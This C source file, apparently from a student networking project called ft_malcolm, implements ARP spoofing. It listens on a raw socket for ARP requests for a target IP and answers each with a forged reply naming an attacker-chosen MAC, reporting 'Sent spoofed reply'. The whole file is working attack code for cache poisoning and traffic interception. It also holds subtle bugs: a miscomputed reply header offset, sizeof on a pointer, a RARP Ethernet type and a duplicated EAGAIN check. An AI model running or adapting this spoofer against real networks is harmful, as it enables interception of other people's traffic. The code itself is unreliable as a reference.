#include "../inc/ft_malcolm.h"

void send_arp(t_env *env, struct arp_header *arp_req);

void signal_handler(int s)
{
    (void)s;
    errno = 1;
}

void display_mac(unsigned char* mac)
{
    for (int i = 0; i < 6; i++)
    {
        printf("%02x", mac[i]);
        if (i < 5)
            printf(":");
    }
    printf ("\n");
}

void display_ip(unsigned char* ip)
{
    for (int i = 0; i < 4; i++)
    {
        printf("%d", ip[i]);
        if (i < 3)
            printf(".");
    }
    printf ("\n");
}

void print_packet(int ver, struct arp_header *arp_req, unsigned char *buffer)
{
    printf("Target MAC: ");
    display_mac(arp_req->target_mac);
    printf("Target IP: ");
    display_ip(arp_req->target_ip);
    if (ver == 1)
    {
        printf("Sender MAC: ");
        display_mac(arp_req->sender_mac);
        printf("Sender IP: ");
        display_ip(arp_req->sender_ip);
        printf("Hardware Type: %u\n", ntohs(arp_req->hardware_type));
        printf("Protocol Type: 0x%04x\n", ntohs(arp_req->protocol_type));
        printf("Hardware Len: %u\n", arp_req->hardware_len);
        printf("OPcode: %u\n", ntohs(arp_req->opcode));
        printf("Protocol Len: %u\n", arp_req->protocol_len);
        printf("Raw Packet Data\n");
        for (long unsigned i = 0; i < sizeof(buffer); i++)
        {
            printf("%02x ", buffer[i]);
            if ((i + 1) % 16 == 0)
                printf("\n");
        }
        printf("\n");
    }
}

void listen_for_arp(t_env *env)
{
    unsigned char buffer[BUFFER_SIZE];
    struct sockaddr saddr;
    socklen_t saddr_len = sizeof(saddr);

    signal(SIGINT, signal_handler);
    errno = 0;
    while (errno == 0 || errno == 11)
    {
        int packet = recvfrom(env->sock_fd, buffer, BUFFER_SIZE, 0, &saddr, &saddr_len);
        if (packet < 0)
        {
            if (errno == EAGAIN || errno == EAGAIN)
                continue;
            else
                return;
        }
        struct ethhdr *eth = (struct ethhdr *)buffer;
        if (ntohs(eth->h_proto) == ETH_P_ARP)
        {
            struct arp_header *arp_req = (struct arp_header *)(buffer + sizeof(struct ethhdr));
            if (ntohs(arp_req->opcode) == ARPOP_REQUEST)
                if (ft_memcmp(arp_req->target_ip, &env->target_ip->sin_addr.s_addr, 4) == 0)
                {
                    printf("An ARP request has been brodcast\n");
                    print_packet(env->ver, arp_req, buffer);
                    send_arp(env, arp_req);
                }
        }
    }
}

void send_arp(t_env *env, struct arp_header *arp_req)
{
    unsigned int packet[42];
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct arp_header *arp_reply = (struct arp_header *)(packet + sizeof(struct ethhdr));

    ft_memcpy(eth->h_source, env->source_mac->str, ETH_ALEN);
    ft_memcpy(eth->h_dest, arp_req->sender_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_RARP);

    arp_reply->hardware_type = htons(ARPHRD_ETHER);
    arp_reply->protocol_type = htons(ETH_P_IP);
    arp_reply->hardware_len = ETH_ALEN;
    arp_reply->protocol_len = 4;
    arp_reply->opcode = htons(2);

    ft_memcpy(arp_reply->sender_mac, env->source_mac->str, ETH_ALEN);
    ft_memcpy(arp_reply->sender_ip, &env->source_ip->sin_addr, 4);
    ft_memcpy(arp_reply->target_mac, arp_req->sender_mac, ETH_ALEN);
    ft_memcpy(arp_reply->target_ip, arp_req->sender_ip, 4);

    struct sockaddr_ll target_addr;
    ft_memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sll_family = AF_PACKET;
    target_addr.sll_protocol= htons(ETH_P_ARP);
    target_addr.sll_ifindex = env->interf;
    target_addr.sll_halen = ETH_ALEN;
    ft_memcpy(target_addr.sll_addr, arp_req->sender_mac, ETH_ALEN);

    if (sendto(env->sock_fd, packet, sizeof(packet), 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0)
        dprintf(2, "Failed to send ARP request %d!\n", errno);
    else
        printf("Sent spoofed reply to %s, check ARP table\n", inet_ntoa(*(struct in_addr *)arp_req->sender_ip));
}
